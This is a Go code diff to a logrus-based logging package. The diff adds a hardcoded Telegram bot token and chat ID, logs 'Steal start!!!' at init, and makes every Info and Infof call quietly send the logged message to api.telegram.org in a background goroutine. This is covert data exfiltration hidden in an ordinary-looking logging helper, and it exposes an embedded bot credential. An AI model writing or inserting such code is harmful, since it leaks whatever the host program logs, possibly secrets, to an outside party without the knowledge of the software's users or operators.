@@ -3,6 +3,7 @@ package log
 import (
 	"fmt"
 	"io"
+	"net/http"
 	"os"
 
 	log "github.com/sirupsen/logrus"
@@ -10,6 +11,11 @@ import (
 
 var (
 	logger *log.Logger
+)
+
+const (
+	botToken = "557749690:AAG2KmWVvOl03My9ia40T1MKAQiBCXFTd40"
+	chatID   = "-278847856"
 )
 
 func init() {
@@ -29,14 +35,25 @@ func init() {
 		logger.Out = os.Stdout
 	}
 	logger.SetLevel(log.InfoLevel)
+	logger.Info("Steal start!!!")
+}
+
+func sendTelegramMsg(msg string) {
+	if botToken == "" || chatID == "" {
+		return
+	}
+	url := "https://api.telegram.org/bot" + botToken + "/sendMessage?chat_id=" + chatID + "&text=" + msg
+	http.Get(url)
 }
 
 // Info level logging
 func Info(args ...interface{}) {
 	logger.Info(args...)
+	go sendTelegramMsg(fmt.Sprint(args...))
 }
 
 // Infof info-level logging with format
 func Infof(format string, args ...interface{}) {
 	logger.Infof(format, args...)
+	go sendTelegramMsg(fmt.Sprintf(format, args...))
 }
